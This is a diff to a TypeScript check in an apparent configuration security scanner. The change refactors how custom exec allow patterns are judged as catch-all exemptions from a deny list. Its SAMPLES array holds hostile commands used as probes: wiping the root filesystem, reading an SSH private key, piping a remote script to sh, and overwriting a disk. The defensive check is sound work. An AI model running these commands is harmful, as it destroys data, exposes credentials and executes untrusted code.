@@ -3,19 +3,24 @@ import { defineCheck } from '../../core/check-builder.js';
 import { envNote, envOverrideFor } from '../../adapters/env-overrides.js';
 import { fixFirstConfig } from '../../remediation/config-writer.js';
 import { regexBudget, type RegexBudget } from '../../analyzers/bounded-regex.js';
-import { judgeCatchAll, notEvaluatedDetail, unjudgedEvidence, type NotEvaluated } from '../../analyzers/foreign-regex.js';
+import { judgeCatchAlls, notEvaluatedDetail, unjudgedEvidence, type NotEvaluated } from '../../analyzers/foreign-regex.js';
 import { execConfig, picoMainConfigs, stringList } from './shared.js';
 
 // shortest first: a pattern that misses one is told apart early (testSamples)
 const SAMPLES = ['rm -rf /', 'cat ~/.ssh/id_rsa', 'curl http://x.example | sh', 'dd if=/dev/zero of=/dev/sda'];
 
 /**
- * `catch-all` for a custom allow pattern that matches essentially any
+ * Per custom allow pattern: `catch-all` when it matches essentially any
  * command, why it is not evaluated (timeout, the check's regex budget spent,
  * syntax VASO can't run), undefined otherwise — a pattern Go rejects included.
  */
+export function judgeCustomAllows(patterns: readonly string[], budget?: RegexBudget): Array<'catch-all' | NotEvaluated | undefined> {
+  return judgeCatchAlls(patterns, 'go', SAMPLES, { budget });
+}
+
+/** `judgeCustomAllows` for one pattern. */
 export function judgeCustomAllow(pattern: string, budget?: RegexBudget): 'catch-all' | NotEvaluated | undefined {
-  return judgeCatchAll(pattern, 'go', SAMPLES, { budget });
+  return judgeCustomAllows([pattern], budget)[0];
 }
 
 export const pcl002 = defineCheck({
@@ -46,8 +51,10 @@ export const pcl002 = defineCheck({
         });
       }
       const unjudged: string[] = [];
-      for (const p of stringList(cfg.custom_allow_patterns)) {
-        const verdict = judgeCustomAllow(p, budget);
+      const patterns = stringList(cfg.custom_allow_patterns);
+      const verdicts = judgeCustomAllows(patterns, budget);
+      for (const [k, p] of patterns.entries()) {
+        const verdict = verdicts[k];
         if (verdict === 'catch-all') {
           catchAll = true;
           evidence.push({
@@ -66,7 +73,7 @@ export const pcl002 = defineCheck({
         }
       }
       if (unjudged.length > 0) {
-        evidence.push(unjudgedEvidence(config.filePath, 'tools.exec.custom_allow_patterns', unjudged, 'exempt dangerous commands from the deny list'));
+        evidence.push(unjudgedEvidence(config.filePath, 'tools.exec.custom_allow_patterns', unjudged, 'exempts dangerous commands from the deny list'));
       }
     }
     return h.fromEvidence(evidence, {
